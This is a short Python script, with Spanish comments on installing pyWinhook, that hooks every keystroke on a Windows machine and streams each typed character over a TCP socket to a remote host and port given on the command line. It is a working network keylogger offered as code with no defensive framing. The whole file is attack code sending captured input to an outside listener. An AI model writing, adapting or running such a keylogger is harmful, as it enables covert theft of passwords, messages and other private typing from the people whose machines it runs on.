#Descargar pyWinhook https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywinhook 
#Seleccionar el fichero WHL para la plataforma sobre la que se ejecutará el programa e instalar. Suponiendo que sea sobre una versión actualizada de Python y con un sistema Windows de 64: 
# python -m pip install pyWinhook‑1.6.2‑pp37‑pypy37_pp73‑win_amd64.whl

import pyWinhook, pythoncom, sys, logging, socket
def registro(event):
    sock.send(chr(event.Ascii).encode())
    return True

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
sock.connect((sys.argv[1], sys.argv[2])) 
hooks_manager = pyWinhook.HookManager() 
hooks_manager.KeyDown = registro 
hooks_manager.HookKeyboard() 
pythoncom.PumpMessages()
